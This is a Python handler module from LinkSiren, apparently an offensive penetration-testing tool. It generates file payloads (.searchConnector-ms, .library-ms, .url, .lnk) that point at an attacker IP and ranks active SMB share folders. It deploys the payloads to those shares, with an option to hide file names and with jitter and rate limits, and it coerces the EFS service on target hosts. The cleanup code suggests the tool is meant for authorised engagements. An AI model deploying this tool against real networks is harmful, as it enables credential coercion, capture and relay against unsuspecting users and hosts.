"""
This module contains handlers for various modes of operation in the LinkSiren application.
Functions:
    handle_generate(args):
        Generates a payload file based on the provided arguments and writes it to the local
        filesystem.
    handle_rank(args, domain, username, password):
        Reads target data, computes rankings based on the provided arguments, and writes the
        rankings to a file.
    handle_identify(args, domain, username, password):
        Identifies and filters targets based on rankings and writes the filtered targets to a file.
    handle_deploy(args, domain, username, password):
        Deploys the generated payload to the specified targets and logs the paths where the payload
        was written.
    handle_cleanup(args, domain, username, password):
        Cleans up the deployed payloads from the specified targets.
"""

import json
import logging
from datetime import datetime
from pathlib import Path
import sys
from linksiren.impure_functions import (
    read_targets,
    get_sorted_rankings,
    write_payload_local,
    write_list_to_file,
    get_lnk_template,
)
from linksiren.pure_functions import (
    filter_targets,
    is_valid_payload_name,
    create_lnk_payload,
    compute_threshold_date,
    make_invisible_payload_name,
    make_invisible_payload_contents,
)


def handle_generate(args):
    """
    Handles the generation of payload files based on the provided arguments.
    Args:
        args: An object containing the following attributes:
            - payload (str): The name of the payload file to be generated.
            - attacker (str): The attacker's IP address to be included in the payload.
    The function performs the following steps:
    1. Checks if the payload name has a valid extension.
    2. Determines the template path based on the payload extension.
    3. Reads the appropriate template file and formats it with the attacker's IP address.
    4. Writes the formatted payload contents to the specified payload file.
    Supported payload extensions:
    - .searchConnector-ms
    - .library-ms
    - .url
    - .lnk
    If the payload extension is '.lnk', a special handling is performed using `get_lnk_template`
    and `create_lnk_payload`.
    """
    available_extensions = [".searchConnector-ms", ".library-ms", ".url", ".lnk"]
    if not is_valid_payload_name(args.payload, available_extensions):
        return

    payload_extension = Path(args.payload).suffix
    template_path = Path(__file__).parent / f"template{payload_extension}"
    invisible = getattr(args, "invisible", False)

    if payload_extension == ".lnk":
        lnk_template = get_lnk_template(template_path)
        payload_contents = create_lnk_payload(args.attacker, lnk_template)
        if invisible:
            # Filename gets the SOH prefix; icon-blanking for .lnk is not
            # supported (would require binary template surgery).
            logging.getLogger("main_logger").warning(
                "--invisible only blanks the filename for .lnk payloads; "
                "icon blanking is unsupported for binary lnk templates.",
                extra={"path": args.payload},
            )
    else:
        with open(template_path, "r", encoding="utf-8") as template_file:
            payload_contents = template_file.read()
            payload_contents = payload_contents.format(attacker_ip=args.attacker)
        if invisible:
            payload_contents = make_invisible_payload_contents(
                payload_contents, payload_extension
            )

    payload_name = (
        make_invisible_payload_name(args.payload) if invisible else args.payload
    )
    write_payload_local(payload_name, payload_contents)


def handle_rank(args, credentials, log_queue):
    """
    Handles the ranking process for the given domain using the provided credentials and arguments.
    Args:
        args (Namespace): A namespace object containing the following attributes:
            - active_threshold (int): The threshold for active links.
            - targets (str): The path to the targets file.
            - max_depth (int): The maximum depth for ranking.
            - fast (bool): A flag indicating whether to use the fast mode.
        domain (str): The domain to be ranked.
        username (str): The username for authentication.
        password (str): The password for authentication.
    Returns:
        None
    Side Effects:
        Writes the sorted rankings to a file named 'folder_rankings.txt' in JSON format.
    """
    threshold_date = compute_threshold_date(datetime.now(), args.active_threshold)
    targets = read_targets(args.targets)
    sorted_rankings = get_sorted_rankings(
        targets=targets,
        credentials=credentials,
        active_threshold_date=threshold_date,
        max_depth=args.max_depth,
        go_fast=args.fast,
        log_queue=log_queue,
        max_concurrency=args.max_concurrency,
        ignore_folders=args.ignore_shares,
    )

    with open("folder_rankings.txt", mode="w", encoding="utf-8") as f:
        f.write(json.dumps(sorted_rankings, indent=4, sort_keys=False))


def handle_identify(args, credentials, log_queue):
    """
    Handles the identification process based on the provided arguments and credentials.

    Args:
        args (Namespace): A namespace object containing the following attributes:
            - active_threshold (int): The threshold in days to consider a target as active.
            - targets (str): The path to the file containing the list of targets.
            - max_depth (int): The maximum depth to search for targets.
            - fast (bool): A flag indicating whether to perform a faster, less thorough search.
            - max_folders_per_target (int): The maximum number of folders to consider per target.
        domain (str): The domain to authenticate against.
        username (str): The username for authentication.
        password (str): The password for authentication.

    Returns:
        None
    """
    threshold_date = compute_threshold_date(datetime.now(), args.active_threshold)
    targets = read_targets(args.targets)
    sorted_rankings = get_sorted_rankings(
        targets=targets,
        credentials=credentials,
        active_threshold_date=threshold_date,
        max_depth=args.max_depth,
        go_fast=args.fast,
        log_queue=log_queue,
        max_concurrency=args.max_concurrency,
        ignore_folders=args.ignore_shares,
    )
    filtered_targets = filter_targets(targets, sorted_rankings, args.max_folders_per_target)
    write_list_to_file(filtered_targets, "payload_targets.txt")
    if getattr(args, "json_output", False):
        print(
            json.dumps(
                {
                    "mode": "identify",
                    "input_targets": len(targets),
                    "payload_targets_count": len(filtered_targets),
                    "payload_targets": filtered_targets,
                }
            )
        )


def handle_deploy(args, credentials):
    """
    Handles the deployment of payloads to specified targets.
    Args:
        args (Namespace): Command-line arguments containing the payload name, attacker IP,
                          and targets.
        domain (str): The domain to use for connecting to targets.
        username (str): The username to use for connecting to targets.
        password (str): The password to use for connecting to targets.
    Returns:
        None
    """
    targets = read_targets(args.targets)
    payloads_written = []
    available_extensions = [".searchConnector-ms", ".library-ms", ".url", ".lnk"]
    if not is_valid_payload_name(args.payload, available_extensions):
        return

    payload_extension = Path(args.payload).suffix
    template_path = Path(__file__).parent / f"template{payload_extension}"
    invisible = getattr(args, "invisible", False)

    if payload_extension == ".lnk":
        lnk_template = get_lnk_template(template_path)
        payload_contents = create_lnk_payload(args.attacker, lnk_template)
        if invisible:
            logging.getLogger("main_logger").warning(
                "--invisible only blanks the filename for .lnk payloads; "
                "icon blanking is unsupported for binary lnk templates.",
                extra={"path": args.payload},
            )
    else:
        with open(template_path, "r", encoding="utf-8") as template_file:
            template_contents = template_file.read()
            payload_contents = template_contents.format(attacker_ip=args.attacker)
        if invisible:
            payload_contents = make_invisible_payload_contents(
                payload_contents, payload_extension
            )

    payload_name = (
        make_invisible_payload_name(args.payload) if invisible else args.payload
    )
    force = getattr(args, "force", False)
    encrypt = getattr(args, "encrypt", False)
    encrypt_keep = getattr(args, "encrypt_keep", False)
    encrypt_target = getattr(args, "encrypt_target", "payload")
    probe_delete = getattr(args, "probe_delete", False)
    encrypt_hosts = set()
    efs_was_stopped = set()

    # PR 6: --exclude / --exclude-defaults-off / --dry-run / --resume /
    # --rate-limit / --jitter-ms
    from linksiren.pure_functions import path_matches_exclude, DEFAULT_EXCLUDE_PATTERNS
    exclude_patterns = list(getattr(args, "exclude", []) or [])
    if not getattr(args, "exclude_defaults_off", False):
        exclude_patterns = list(DEFAULT_EXCLUDE_PATTERNS) + exclude_patterns
    dry_run = getattr(args, "dry_run", False)
    resume = getattr(args, "resume", False)
    rate_limit = float(getattr(args, "rate_limit", 0.0) or 0.0)
    min_interval = (1.0 / rate_limit) if rate_limit > 0 else 0.0
    jitter_raw = getattr(args, "jitter_ms", "") or ""
    jitter_lo = jitter_hi = 0
    if jitter_raw:
        try:
            lo_s, hi_s = jitter_raw.split(",", 1)
            jitter_lo, jitter_hi = int(lo_s), int(hi_s)
            if jitter_lo < 0 or jitter_hi < jitter_lo:
                raise ValueError("MIN must be >= 0 and <= MAX")
        except Exception as e:
            print(f"error: --jitter-ms expects MIN,MAX milliseconds; got {jitter_raw!r} ({e})", file=sys.stderr)
            sys.exit(2)

    # --resume: read payloads_written.txt and skip target *folders* already done.
    already_done = set()
    if resume:
        try:
            with open("payloads_written.txt", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    parts = line.rsplit("\\", 1)
                    if len(parts) == 2:
                        already_done.add(parts[0])
        except FileNotFoundError:
            pass

    # Apply --exclude before any SMB activity.
    if exclude_patterns:
        for target in targets:
            target.paths = [p for p in target.paths if not path_matches_exclude(p, exclude_patterns)]

    # --dry-run: print the planned writes and bail.
    if dry_run:
        planned = []
        for target in targets:
            for path in target.paths:
                planned.append(f"\\\\{target.host}\\{path}\\{payload_name}")
        print(f"DRY RUN. Would write {len(planned)} payload(s):")
        for p in planned:
            print(f"  {p}")
        return

    import time, random
    last_write = 0.0
    for target in targets:
        target.connect(credentials)
        if encrypt and target.connection is not None:
            from linksiren.target import _efs_service_is_running
            initial = _efs_service_is_running(target.connection)
            if initial is False:
                efs_was_stopped.add(target.host)
        for path in target.paths:
            folder_unc = f"\\\\{target.host}\\{path}"
            if resume and folder_unc in already_done:
                logging.getLogger("main_logger").info(
                    "deploy --resume: skipping target already in payloads_written.txt",
                    extra={"path": folder_unc},
                )
                continue
            if min_interval > 0:
                elapsed = time.monotonic() - last_write
                wait = min_interval - elapsed
                if wait > 0:
                    time.sleep(wait)
            if jitter_hi > 0:
                time.sleep(random.uniform(jitter_lo, jitter_hi) / 1000.0)
            new_payload_path = target.write_payload(
                path=path,
                payload_name=payload_name,
                payload=payload_contents,
                force=force,
                encrypt=encrypt,
                encrypt_keep=encrypt_keep,
                encrypt_target=encrypt_target,
                probe_delete=probe_delete,
            )
            last_write = time.monotonic()
            if new_payload_path is not None:
                payloads_written.append(new_payload_path)
                if encrypt:
                    encrypt_hosts.add(target.host)

    write_list_to_file(payloads_written, "payloads_written.txt", "w")
    # Sidecar tracking: which hosts likely have an EFS service started by
    # the --encrypt trigger. Cleanup uses this to WARN that the EFS service
    # is probably still Running on those hosts even after the payload is
    # deleted — a real artifact left by the engagement.
    if encrypt_hosts:
        write_list_to_file(
            sorted(encrypt_hosts), "encrypt_triggered_hosts.txt", "w"
        )
    # Second sidecar: hosts where EFS was *confirmed Stopped* before our
    # deploy. cleanup --stop-efs only stops EFS on this strict subset so we
    # never turn off a service that was legitimately running for non-engagement
    # reasons.
    if efs_was_stopped:
        write_list_to_file(
            sorted(efs_was_stopped), "efs_started_by_us.txt", "w"
        )
    if getattr(args, "json_output", False):
        print(
            json.dumps(
                {
                    "mode": "deploy",
                    "payload": args.payload,
                    "attacker": args.attacker,
                    "payloads_attempted": sum(len(t.paths) for t in targets),
                    "payloads_written": payloads_written,
                    "encrypt_hosts": sorted(encrypt_hosts),
                    "efs_started_by_us": sorted(efs_was_stopped),
                }
            )
        )


def handle_coerce(args, credentials):
    """Trigger the EFS service on each target host without dropping payloads.

    Reuses the existing-file-encryption trick: probe EFS state, wake it via
    a brief throwaway encrypted-file if needed, EFSR-encrypt and decrypt the
    smallest existing file in each target folder. Records hosts that were
    initially-Stopped into ``efs_started_by_us.txt`` so a later
    ``cleanup --stop-efs`` can revert them cleanly.
    """
    targets = read_targets(args.targets)
    triggered_hosts = set()
    efs_was_stopped = set()
    logger = logging.getLogger("main_logger")

    from linksiren.target import (
        _efs_service_is_running,
        _efsr_encrypt_remote,
        _efsr_decrypt_remote,
    )

    for target in targets:
        target.connect(credentials)
        if target.connection is None:
            continue
        initial = _efs_service_is_running(target.connection)
        if initial is False:
            efs_was_stopped.add(target.host)
        for path in target.paths:
            share = path.split("\\")[0]
            folder = "\\".join(path.split("\\")[1:])
            smallest_rel = target._find_smallest_existing_file(share, folder)
            if smallest_rel is None:
                logger.warning(
                    "coerce: no non-empty existing file in target folder; "
                    "cannot place EFS trigger here.",
                    extra={"path": f"\\\\{target.host}\\{share}\\{folder}"},
                )
                continue
            smallest_unc = f"\\\\{target.host}\\{share}\\{smallest_rel}"
            if initial is not True:
                target._wake_efs_via_throwaway(share, folder)
            try:
                _efsr_encrypt_remote(target.connection, smallest_unc, logger=logger)
                logger.info(
                    "coerce: encrypted existing file to trigger EFS.",
                    extra={"path": smallest_unc},
                )
                try:
                    _efsr_decrypt_remote(
                        target.connection, smallest_unc, logger=logger
                    )
                    logger.info(
                        "coerce: reverted encryption on existing file.",
                        extra={"path": smallest_unc},
                    )
                except Exception as e:
                    logger.warning(
                        "coerce: encryption succeeded but revert failed; "
                        "existing file remains EFS-encrypted on disk.",
                        extra={"path": smallest_unc, "exception": str(e)},
                    )
                triggered_hosts.add(target.host)
            except Exception as e:
                logger.warning(
                    "coerce: EfsRpcEncryptFileSrv failed on the chosen "
                    "existing file; EFS may not be reachable.",
                    extra={"path": smallest_unc, "exception": str(e)},
                )

    if triggered_hosts:
        write_list_to_file(
            sorted(triggered_hosts), "encrypt_triggered_hosts.txt", "w"
        )
    if efs_was_stopped:
        write_list_to_file(
            sorted(efs_was_stopped), "efs_started_by_us.txt", "w"
        )
    print(
        f"coerce: triggered EFS on {len(triggered_hosts)} host(s); "
        f"{len(efs_was_stopped)} were initially Stopped (eligible for "
        "cleanup --stop-efs revert).",
        file=sys.stderr,
    )


def handle_cleanup(args, credentials):
    """
    Handles the cleanup process by connecting to each target and deleting specified payloads.

    Args:
        args (Namespace): A namespace object containing the following attributes:
            - targets (str): Path to the file containing the list of targets.
            - payload (str): The payload to be deleted from each target.
        domain (str): The domain to use for connecting to the targets.
        username (str): The username to use for connecting to the targets.
        password (str): The password to use for connecting to the targets.

    Returns:
        None
    """
    payloads_not_deleted = []
    targets = read_targets(args.targets)
    # Read the "EFS was stopped before deploy" sidecar — strict subset of
    # hosts where --stop-efs is allowed to stop the service.
    stop_efs = getattr(args, "stop_efs", False)
    try:
        with open("efs_started_by_us.txt", encoding="utf-8") as f:
            efs_started_by_us = {line.strip() for line in f if line.strip()}
    except FileNotFoundError:
        efs_started_by_us = set()
    stopped_hosts = []
    refused_hosts = []
    for target in targets:
        target.connect(credentials)
        # Use ``extend`` so failures from earlier hosts aren't dropped on the
        # floor when iterating multiple targets.
        payloads_not_deleted.extend(target.delete_payloads())
        # Stop EFS only if (a) pentester opted in, (b) we recorded this host
        # as initially-stopped before our deploy, AND (c) EFS is currently
        # running. The (c) check avoids spurious stop attempts and is the
        # honest interpretation of "only stop what we started".
        if stop_efs and target.host in efs_started_by_us:
            from linksiren.target import (
                _efs_service_is_running,
                _efs_service_stop,
            )
            if _efs_service_is_running(target.connection) is True:
                if _efs_service_stop(target.connection, logger=logging.getLogger("main_logger")):
                    stopped_hosts.append(target.host)
                else:
                    refused_hosts.append(target.host)

    write_list_to_file(payloads_not_deleted, "payloads_not_deleted.txt", "w")

    # If the prior deploy tracked --encrypt-triggered hosts, warn that the
    # EFS service is likely still Running on them — deleting the payload
    # does not stop the service. The pentester can verify with:
    #   Get-Service EFS  (PowerShell on the target)
    try:
        with open("encrypt_triggered_hosts.txt", encoding="utf-8") as f:
            triggered = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        triggered = []
    main_log = logging.getLogger("main_logger")
    if stop_efs:
        if stopped_hosts:
            msg = (
                f"Stopped EFS service via SCMR on {len(stopped_hosts)} "
                f"host(s): {', '.join(stopped_hosts)}. These hosts had EFS "
                "Stopped before our deploy; the service was woken by our "
                "--encrypt trigger and is now restored to the original state."
            )
            main_log.info(msg, extra={"path": None})
            print(msg, file=sys.stderr)
        if refused_hosts:
            msg = (
                f"--stop-efs requested but SCMR stop FAILED on "
                f"{len(refused_hosts)} host(s): {', '.join(refused_hosts)}. "
                "Common cause: the calling account lacks privilege to stop "
                "services. EFS service is still RUNNING on these hosts."
            )
            main_log.warning(msg, extra={"path": None})
            print(msg, file=sys.stderr)
        # Hosts that had EFS already-running pre-deploy are deliberately
        # left alone — they didn't change state because of us.
        already_running = sorted(set(triggered) - efs_started_by_us)
        if already_running:
            msg = (
                "--stop-efs left EFS untouched on "
                f"{len(already_running)} host(s) that had EFS already "
                "Running before deploy (not our state to revert): "
                + ", ".join(already_running)
            )
            main_log.info(msg, extra={"path": None})
            print(msg, file=sys.stderr)
    elif triggered:
        msg = (
            "EFS service is likely still RUNNING on "
            f"{len(triggered)} host(s) that received an --encrypt payload "
            "during deploy: "
            + ", ".join(triggered)
            + ". Cleanup removed the file(s) but did not stop the service. "
            "Use cleanup --stop-efs to stop it automatically (only acts on "
            "hosts where EFS was confirmed Stopped before deploy), or "
            "verify with `Get-Service EFS` and stop out-of-band."
        )
        main_log.warning(msg, extra={"path": None})
        print(msg, file=sys.stderr)

    if len(payloads_not_deleted) == 0:
        print("All payloads deleted successfully.")
    else:
        print(
            "Some payloads could not be deleted. See 'payloads_not_deleted.txt' "
            "and CRITICAL level events in linksiren.log for details.",
            file=sys.stderr,
        )
